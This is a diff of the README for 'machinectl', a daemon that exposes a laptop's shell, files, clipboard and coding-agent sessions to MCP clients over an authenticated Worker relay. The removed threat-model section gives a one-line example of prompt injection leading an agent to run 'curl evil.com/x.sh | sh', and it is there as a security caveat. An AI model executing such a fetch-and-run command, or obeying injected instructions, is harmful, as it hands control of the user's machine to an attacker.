@@ -1,107 +1,77 @@
 # machinectl
 
-Your laptop, as a remotely callable MCP tool runtime. The daemon opens an outbound WebSocket to a compatible operator-controlled Worker endpoint; that Worker is responsible for authentication, routing, and audit handling.
+Laptop-side daemon for exposing local tools to an MCP client through an authenticated Worker relay.
 
-> **Deployment note:** this repository contains the laptop-side daemon only. You must provide a compatible Worker-side `MachineHost` endpoint protected by an authentication policy you control. Do not connect this daemon to an endpoint you do not trust.
+`machinectl` does not open an inbound server or create a tunnel. It connects outbound to a compatible Worker endpoint, publishes its tool catalog, executes relayed tool calls locally, and sends results back over the same WebSocket.
 
-## What changed from the prototype
+This repository contains the laptop daemon only. You must provide a compatible Worker-side endpoint and its authentication and audit policy.
 
-The original machinectl bound a local port and pushed a Cloudflare quick tunnel up so an MCP client could reach in. That meant:
+## Architecture
 
-- The tunnel URL was the secret. Auth = "don't share the URL."
-- The local daemon was the audit boundary. Lose the daemon, lose the trail.
-- Anyone who learned the URL had a remote shell on your laptop.
-
-**This version inverts that.** No inbound port, no quick tunnel. The laptop daemon opens an outbound WebSocket to an operator-controlled Worker. The Worker is the MCP endpoint and owns authentication, routing, and any audit policy. The laptop is only the execution runtime.
-
-```
-                       ┌──────────────────────────────┐
-                       │ MCP client                   │
-                       │ (MCP-capable client)         │
-                       └──────────────┬───────────────┘
-                                      │ POST /machinectl/mcp
-                                      │ (operator-configured authentication)
-                                      ▼
-                       ┌──────────────────────────────┐
-                       │ compatible Worker endpoint   │
-                       │  • authentication gate       │
-                       │  • per-user MachineHost DO   │
-                       │  • audit policy/receipts     │
-                       └──────────────┬───────────────┘
-                                      │ WebSocket (outbound from laptop)
-                                      │ keyed by Access email
-                       ┌──────────────▼───────────────┐
-                       │ machinectl daemon            │
-                       │ (this repo, on your laptop)  │
-                       │  • allow-listed tools        │
-                       │  • path-restricted FS access │
-                       └──────────────────────────────┘
+```text
+MCP client
+   │
+   │ POST /machinectl/mcp
+   ▼
+Authenticated Worker endpoint
+   │
+   │ outbound WebSocket connection initiated by laptop
+   ▼
+machinectl daemon
+   │
+   ├── shell / git / file / desktop tools
+   ├── live pi RPC sessions
+   └── captured OpenCode jobs
 ```
 
-Close your laptop → WS drops → tools auto-disappear from MCP `tools/list`. No "tunnel I forgot was open."
+When the daemon disconnects, no laptop tools are callable through MCP `tools/list`.
+
+## Requirements
+
+- Node.js 20 or later
+- A compatible Worker-side `MachineHost` endpoint
+- `cloudflared` if the endpoint uses Cloudflare Access authentication
+- macOS or Linux for platform-dependent desktop tools
 
 ## Install
 
 ```bash
-git clone https://github.com/acoyfellow/machinectl ~/cloudflare/machinectl
-cd ~/cloudflare/machinectl
+git clone https://github.com/acoyfellow/machinectl
+cd machinectl
 npm install
 npm run build
 ```
 
-You need `cloudflared` installed locally so the daemon can fetch your Access JWT. Install once:
+## Configure
 
-```bash
-brew install cloudflared
-```
-
-## Configure endpoint and authenticate
-
-Set the trusted compatible Worker endpoint explicitly:
+Set the URL of a trusted compatible Worker endpoint:
 
 ```bash
 export MACHINECTL_URL=https://machinectl.example.com
 ```
 
-If your endpoint is protected by Cloudflare Access, authenticate to that URL once:
+If the endpoint uses Cloudflare Access, install `cloudflared` and authenticate once:
 
 ```bash
-cloudflared access login https://machinectl.example.com
+brew install cloudflared
+cloudflared access login "$MACHINECTL_URL"
 ```
 
-The daemon obtains the cached Access JWT for the configured `MACHINECTL_URL` via `cloudflared access token`. Re-run login when your endpoint's Access session expires. For local testing or alternative launch environments, `MACHINECTL_ACCESS_TOKEN` may provide the token explicitly.
+At startup and reconnect, the daemon obtains the cached token with `cloudflared access token --app="$MACHINECTL_URL"` and sends it in the WebSocket upgrade request. For testing or non-interactive launch environments, set `MACHINECTL_ACCESS_TOKEN` explicitly.
 
 ## Run
 
-`MACHINECTL_ALLOWED_PATHS` is a comma-separated list of **absolute directory prefixes** used by `read_file`, `write_file`, `list_directory`, local-file targets passed to `open`, optional `cwd` checks for shell-capable tools, and local coding-agent sessions. It does **not** sandbox the contents of `exec_command` or the current shell-interpreted `git` tool. It has zero relationship to where the daemon binary itself lives.
+Choose which directories dedicated file tools and local coding-agent sessions may operate within:
 
 ```bash
-# Allow filesystem tools to operate inside your project trees.
 MACHINECTL_URL=https://machinectl.example.com \
 MACHINECTL_ALLOWED_PATHS=/Users/you/projects,/Users/you/work \
-  ~/cloudflare/machinectl/dist/index.js
+  node dist/index.js
 ```
 
-Want to open it to your whole home dir? Sure — but think about what's in there (`.ssh/`, `.aws/`, browser sessions, etc.) before you do:
+Example output:
 
-```bash
-MACHINECTL_URL=https://machinectl.example.com MACHINECTL_ALLOWED_PATHS=$HOME \
-  ~/cloudflare/machinectl/dist/index.js
-```
-
-Want the daemon to run, but catalogued filesystem and coding-agent tools to be unavailable? Just leave the var unset:
-
-```bash
-MACHINECTL_URL=https://machinectl.example.com ~/cloudflare/machinectl/dist/index.js
-# → [!] filesystem and agent-session tools are DISABLED
-# → [!] set MACHINECTL_ALLOWED_PATHS=/abs/path1,/abs/path2 and restart to enable
-```
-
-`exec_command` and `git` always register. Their *optional* `cwd` argument is path-gated if supplied; without `cwd`, they run in the daemon's PWD. Their shell command content can still read or modify any resource available to the local user. Local-agent controls (`agent_*`) register only when allowed paths are configured because every new pi/OpenCode process must start in an explicitly scoped repository. `screenshot`, `processes`, `clipboard`, and `notify` are unaffected; `open` remains published for URLs but applies path checks to local-file targets.
-
-Output on a successful connect:
-
-```
+```text
 [machinectl] machinectl daemon — machine: "your-macbook"
 [machinectl] worker: https://machinectl.example.com
 [machinectl] tools registered: exec_command, git, agent_start, agent_list, agent_status, agent_logs, agent_prompt, agent_steer, agent_follow_up, agent_pi_command, agent_abort, agent_stop, read_file, write_file, list_directory, screenshot, processes, clipboard, notify, open
@@ -109,106 +79,132 @@ Output on a successful connect:
 [machinectl] connected; publishing tool catalog
 ```
 
-An MCP client capable of authenticating through your endpoint's configured policy can call `https://machinectl.example.com/machinectl/mcp`. The call lands at the Worker, is handled according to its audit policy, is forwarded over your WebSocket, executes on your laptop, and returns along the same path. With allowed paths configured, the current daemon catalog contains 20 tools; without them, filesystem and `agent_*` tools are not published.
+If `MACHINECTL_ALLOWED_PATHS` is not set, `read_file`, `write_file`, `list_directory`, and `agent_*` are not published. `open` remains available for URLs but rejects local-file targets unless their paths are allowed.
 
-## Config
+`MACHINECTL_ALLOWED_PATHS` is not a shell sandbox. `exec_command` can access anything available to the local user. In the current release, `git` is also shell-interpreted and must be treated as shell-equivalent.
 
-| Env var | Default | What it does |
-|---|---|---|
-| `MACHINECTL_URL` | (operator endpoint required) | Base URL of your trusted compatible Worker endpoint, e.g. `https://machinectl.example.com`. Set this explicitly before running the daemon. |
-| `MACHINECTL_NAME` | `os.hostname()` | Human-readable machine name surfaced in the catalog + audit logs. |
-| `MACHINECTL_ALLOWED_PATHS` | (empty) | Comma-separated absolute directory prefixes the filesystem tools (`read_file`, `write_file`, `list_directory`) and local coding-agent sessions may touch. **Filesystem and `agent_*` tools refuse to register if empty.** Multiple paths: `MACHINECTL_ALLOWED_PATHS=/Users/me/work,/Users/me/projects,/tmp/scratch`. Unrelated to where the daemon binary lives. |
-| `MACHINECTL_EXEC_TIMEOUT` | `60000` | Per-call timeout in ms for `exec_command` and `git`; minimum 1000 ms. No maximum is currently enforced. |
-| `MACHINECTL_ACCESS_TOKEN` | (unset) | Override for the Access JWT instead of pulling from cloudflared. Useful in CI / containers. |
-| `MACHINECTL_AGENT_MAX_SESSIONS` | `4` | Maximum concurrently active local pi/OpenCode sessions. Min 1, max 32. |
-| `MACHINECTL_AGENT_MAX_RUNTIME_MS` | `7200000` | Hard lifetime limit per local coding-agent session (default 2 hours; min 1 minute, max 24 hours). |
-| `MACHINECTL_AGENT_STOP_GRACE_MS` | `5000` | Grace period after SIGTERM before the agent process group is SIGKILLed. |
+## Configuration
+
+| Variable | Default | Description |
+|---|---:|---|
+| `MACHINECTL_URL` | required | Trusted compatible Worker endpoint base URL. |
+| `MACHINECTL_NAME` | `os.hostname()` | Machine name published to the Worker. |
+| `MACHINECTL_ALLOWED_PATHS` | empty | Comma-separated directory roots for dedicated file tools, local-file `open` targets, optional `cwd` validation, and `agent_*` sessions. |
+| `MACHINECTL_ACCESS_TOKEN` | unset | Explicit authentication token override instead of retrieving a Cloudflare Access token with `cloudflared`. |
+| `MACHINECTL_EXEC_TIMEOUT` | `60000` | Timeout in milliseconds for `exec_command` and `git`. Minimum 1000 ms; no maximum is currently enforced. |
+| `MACHINECTL_AGENT_MAX_SESSIONS` | `4` | Maximum concurrently active pi/OpenCode sessions. Range: 1–32. |
+| `MACHINECTL_AGENT_MAX_RUNTIME_MS` | `7200000` | Maximum local coding-agent session runtime. Range: 1 minute–24 hours. |
+| `MACHINECTL_AGENT_STOP_GRACE_MS` | `5000` | Grace period between `SIGTERM` and `SIGKILL` for agent process groups. |
 
 ## Tools
 
-| Tool | Description | Path-gated |
+### Machine tools
+
+| Tool | Description | Path behavior |
 |---|---|---|
-| `exec_command` | Run a shell command. Captures stdout/stderr/exit. 256KB output cap. Timeout from `MACHINECTL_EXEC_TIMEOUT`. | Optional cwd is gated. |
-| `git` | Run a shell command prefixed with `git` after checking that its first token is one of the listed git subcommands. **Because arguments are presently shell-interpreted, this tool is shell-equivalent and not a security boundary.** | Optional cwd is gated; command content is not confined. |
-| `read_file` | Read a file (utf-8). Up to 256KB; larger files truncated with a notice. | Yes |
-| `write_file` | Write content to a file. Creates parent dirs. Overwrites. | Yes |
-| `list_directory` | List a directory. Set `recursive=true` and `maxDepth` (1–8, default 3) to walk children. | Yes |
-| `screenshot` | Capture the screen, return base64 PNG. macOS: `screencapture`. Linux: `grim`/`scrot`. | No |
-| `processes` | Top N processes by cpu or memory. | No |
-| `clipboard` | Read/write the system clipboard. macOS: `pbpaste`/`pbcopy`. Linux: `wl-copy` / `xclip`. | No |
-| `notify` | Send a system notification. macOS: `osascript`. Linux: `notify-send`. | No |
-| `open` | Open a URL or file in the system default handler. URLs are unrestricted. This tool remains published without allowed paths; local-file targets are rejected at call time unless permitted. | File target gated at call time. |
-| `agent_start` | Start a local `pi` session over RPC, or a captured bounded `opencode run` job. | Requires a `cwd` inside configured allowed paths. |
-| `agent_list` / `agent_status` / `agent_logs` | Inspect active sessions, structured pi events, captured output, and optionally recent saved pi sessions for resume. | No additional path access. |
-| `agent_prompt` / `agent_steer` / `agent_follow_up` | Prompt or steer a live pi RPC session. | Existing session only. |
-| `agent_pi_command` | Run allow-listed pi controls: state/messages/stats, model/thinking changes, compact, switch/fork/clone/export. | Existing session only. |
-| `agent_abort` / `agent_stop` | Interrupt active work or stop the local agent process. | Existing session only. |
+| `exec_command` | Execute a shell command and return stdout/stderr/exit status. | Optional `cwd` is checked; shell command contents are unrestricted. |
+| `git` | Execute a shell-interpreted command prefixed with `git` after validating the first subcommand token. | Optional `cwd` is checked; currently shell-equivalent. |
+| `read_file` | Read a UTF-8 file, truncated above 256 KB. | Requires allowed path. |
+| `write_file` | Write UTF-8 content, creating parent directories. | Requires allowed path. |
+| `list_directory` | List a directory; optional recursive traversal with bounded depth. | Requires allowed path. |
+| `screenshot` | Capture a PNG screenshot and return base64 data. | No path restriction. |
+| `processes` | List top processes by CPU or memory. | No path restriction. |
+| `clipboard` | Read or write the system clipboard. | No path restriction. |
+| `notify` | Send a system notification. | No path restriction. |
+| `open` | Open a URL or local file in the default handler. | URLs unrestricted; file targets checked at call time. |
 
-## Local coding agents
+### Coding-agent tools
 
-`machinectl` can act as a remote control plane for coding agents already authenticated and configured on your laptop.
+`agent_*` tools are published only when `MACHINECTL_ALLOWED_PATHS` is configured.
 
-### pi: live, steerable sessions
+| Tool | Description |
+|---|---|
+| `agent_start` | Start a local pi RPC session or captured OpenCode job in an allowed working directory. |
+| `agent_list` | List active/recent daemon sessions and optionally discover permitted persisted pi sessions. |
+| `agent_status` | Read status and recent structured pi events. |
+| `agent_logs` | Read captured stdout/stderr. |
+| `agent_prompt` | Send a prompt to a live pi session. |
+| `agent_steer` | Queue steering guidance for a running pi session. |
+| `agent_follow_up` | Queue follow-up work for a pi session. |
+| `agent_pi_command` | Execute an allow-listed pi RPC control command. |
+| `agent_abort` | Abort current pi work or terminate an OpenCode job. |
+| `agent_stop` | Stop the tracked coding-agent process tree. |
 
-`agent_start({ agent: "pi", cwd: "/absolute/repo", prompt: "..." })` starts `pi --mode rpc` locally and returns a machinectl session id. That session remains alive in the daemon so an MCP caller can subsequently:
+## Pi sessions
 
-- list recent persisted pi sessions with `agent_list({ includePersistedPi: true })` and reopen one via `agent_start({ agent: "pi", session: "<id-or-path>", ... })`
-- send more work with `agent_prompt`
-- steer in-flight work with `agent_steer`
-- queue later work with `agent_follow_up`
-- inspect events/transcript/state with `agent_status` and `agent_pi_command`
-- change model or thinking level with `agent_pi_command`
-- abort or stop it with `agent_abort` / `agent_stop`
-
-Example sequence from an MCP caller:
+Pi runs through its RPC mode:
 
 ```text
-agent_start({agent:"pi", cwd:"/Users/me/projects/my-app", prompt:"inspect the failing tests and fix them"})
-agent_status({id:"<returned id>"})
-agent_steer({id:"<returned id>", message:"do not modify migrations; keep the fix in UI code"})
-agent_pi_command({id:"<returned id>", command:"get_last_assistant_text"})
+pi --mode rpc
 ```
 
-### OpenCode: captured bounded jobs
+Example MCP tool sequence:
 
-`agent_start({ agent: "opencode", cwd: "/absolute/repo", prompt: "..." })` starts `opencode run --format json` and captures its output. Poll it with `agent_status` / `agent_logs` or stop it with `agent_stop`. Live prompt/steer controls are deliberately pi-only until OpenCode's programmatic session transport is integrated.
+```text
+agent_start({
+  agent: "pi",
+  cwd: "/Users/me/projects/my-app",
+  prompt: "inspect the failing tests and explain the likely fix"
+})
 
-Agent processes inherit the daemon's user environment and local CLI credentials. `agent_start` refuses to run unless `MACHINECTL_ALLOWED_PATHS` is configured and its `cwd` falls within one of those roots. Saved pi-session discovery only exposes sessions whose recorded `cwd` remains inside those roots; explicit session paths, `switch_session`, and explicit `export_html` output paths are likewise gated. Running-session control state is held in daemon memory: if the daemon restarts, active session handles are lost, although pi-persisted session files may later be reopened. Agent processes are capped by count and runtime, are stopped as process groups on supported platforms, and tracked sessions are terminated when the daemon shuts down. Restrict who can access the MCP endpoint accordingly.
+agent_status({ id: "<returned session id>" })
+agent_steer({ id: "<returned session id>", message: "do not modify migrations" })
+agent_pi_command({ id: "<returned session id>", command: "get_last_assistant_text" })
+agent_stop({ id: "<returned session id>" })
+```
 
-## Audit
+Allowed pi control commands include state/messages/stats queries, model and thinking changes, compaction, session naming, fork/clone, session switching, and HTML export. Explicit session paths, session switching paths, and explicit export output paths are validated against configured allowed roots.
 
-Audit behavior is implemented by the Worker endpoint, not by this daemon. In one compatible reference implementation, a post-execution receipt is attempted in a KV namespace, keyed `machinectl:<identity>:<ts>:<rand>` with a 90-day TTL. Its current receipt shape includes timestamp, tool name, **raw arguments**, ok/error, and a result-content preview capped at 2 KB. A Worker built this way may retain sensitive material such as commands, prompt text, paths, clipboard input, or file/output excerpts. Do not use secret-bearing inputs or request sensitive output unless you trust and have reviewed your Worker's receipt policy.
+Pi session process handles and recent events are held in daemon memory. If the daemon restarts, active control handles are lost; pi-persisted session files may still be reopened later.
 
-Receipts are written after execution; a Worker-side receipt write failure can occur after a laptop action has already completed. Operators should implement the audit retention, redaction, alerting, and failure policy appropriate to their deployment.
+## OpenCode jobs
 
-## What's intentionally limited
+OpenCode runs as a captured bounded process:
 
-- **No `MACHINECTL_TOKEN` / bearer-token-as-URL.** With a Cloudflare Access-protected endpoint, an Access JWT is the authentication mechanism used by this daemon. Operators using another compatible endpoint own its authentication design.
-- **No quick tunnel.** No public URL to leak.
-- **No local dashboard.** Any audit inspection or dashboard experience belongs to your Worker-side deployment, not this laptop daemon.
-- **`exec_command` is full shell, by design.** The current `git` implementation is also shell-equivalent despite checking its first subcommand token; do not rely on it as a restricted execution boundary until it is changed to invoke Git without a shell.
-- **Filesystem and `agent_*` tools refuse to register without `MACHINECTL_ALLOWED_PATHS`.** No `$HOME` default. Forces deliberate scoping.
-- **One laptop per user at a time.** Latest WS connection wins; previous gets a clean close. If you connect from your work laptop while your home laptop is already up, the home laptop disconnects.
+```text
+opencode run --format json --dir <allowed-directory> <prompt>
+```
 
-## Threat model (honest)
+Use `agent_status`, `agent_logs`, and `agent_stop` to monitor or terminate it. Live prompt and steering controls are currently implemented only for pi.
 
-The blast radius of `exec_command` is the same as any LLM-driven terminal you already permit on this machine (Claude Code, OpenCode, Codex, etc.). Machinectl changes the transport and attribution model: the laptop makes an outbound connection to an authenticated Worker endpoint rather than exposing a local quick tunnel. That can improve access control and accountability, but it also introduces Worker-side routing and audit-retention risks that operators must evaluate.
+## Authentication and audit boundary
 
-- Caller attribution is determined by the configured Worker authentication policy.
-- The reference Worker design can emit centralized audit receipts, whose redaction and failure semantics must be treated as part of the security boundary.
-- Dedicated path tools (`read_file`, `write_file`, `list_directory`) and local-file `open` targets are scoped to `MACHINECTL_ALLOWED_PATHS` with realpath enforcement against symlink escapes; optional `cwd` checks do not sandbox shell command contents.
-- No inbound laptop port or quick tunnel is required; only the configured Worker endpoint is remotely reachable.
+The Worker endpoint is outside this package and is part of the security boundary. It is responsible for:
 
-What it does **not** defend against:
-- A compromised laptop. For Cloudflare Access-based deployments, theft of locally cached Access credentials may allow impersonation until those credentials expire or are revoked.
-- Prompt injection convincing the agent to run `curl evil.com/x.sh | sh`. A Worker may attribute and receipt the action according to its policy; it does not prevent execution. This is the existing trust model of every LLM-with-shell tool.
-- An LLM you don't trust. The threat model assumes the LLM-on-the-other-end is operating in your interest. If it isn't, no audit log saves you.
+- authenticating MCP callers and laptop WebSocket connections;
+- routing a caller to the intended machine;
+- applying rate, size, and concurrency limits;
+- deciding whether and how tool calls are audited;
+- retaining, redacting, or discarding sensitive request/result material.
 
-If you would not run a long-lived terminal session with an LLM that has shell access on this machine, do not run `machinectl`. If you would, evaluate the configured Worker's authentication, routing, and receipt-retention behavior as additional parts of that trust decision.
+A Worker implementation may retain tool arguments or output excerpts in its audit store. Review that behavior before transmitting secrets, reading sensitive files, copying credentials, or returning secret-bearing command output.
 
-## Multi-machine
+## Security model
 
-The current design is single-machine-per-user. The MCP catalog the Worker exposes is whatever that one connected laptop publishes. The wire format already includes a `machineName` in the `hello` frame, so multi-machine routing (for example a per-call `machine` argument) is a straightforward extension, but is not implemented yet.
+`exec_command` is shell-equivalent and enabled by default. The current `git` tool must also be treated as shell-equivalent because its arguments are interpreted by a shell after a first-token check.
+
+Do not run `machinectl` unless you trust:
+
+- the configured Worker endpoint;
+- its authentication and audit policy;
+- the MCP clients and users authorized to call it;
+- the agent or model issuing commands.
+
+Path restrictions apply to dedicated path-based operations and coding-agent session locations. They do not restrict arbitrary shell command contents.
+
+See [SECURITY.md](./SECURITY.md) for vulnerability reporting and additional security guidance.
+
+## Worker protocol
+
+A compatible Worker endpoint must support the protocol in [`src/protocol.ts`](./src/protocol.ts):
+
+- laptop connects to `GET /machinectl/connect` using WebSocket upgrade;
+- laptop sends a `hello` frame containing machine name and tool catalog;
+- Worker sends `call` frames containing tool name and arguments;
+- laptop responds with correlated `result` frames;
+- Worker exposes an MCP endpoint, typically `POST /machinectl/mcp`, to its authenticated clients.
+
+The Worker implementation is not included in this repository.
 
 ## Development
 
@@ -218,12 +214,6 @@ npm run typecheck
 npm test
 npm run dev
 ```
-
-The Worker-side relay is not bundled into this npm package. To run an endpoint, implement the outbound WebSocket and MCP routing contract documented by `src/protocol.ts`, protect it with an authentication policy you control, and set `MACHINECTL_URL` to that deployment. Worker implementations may expose additional authenticated native invocation surfaces beyond the public daemon protocol; those surfaces are not provided by this repository.
-
-## Security reporting
-
-This project deliberately provides remote shell-equivalent capability through `exec_command` (enabled by default) and, in the current release, through the shell-interpreted `git` tool as well. Do not run it against an endpoint you do not control or trust. If you find a vulnerability in authentication, routing, path enforcement, execution lifecycle, or audit behavior, please open a GitHub security advisory rather than a public exploit issue.
 
 ## License
 
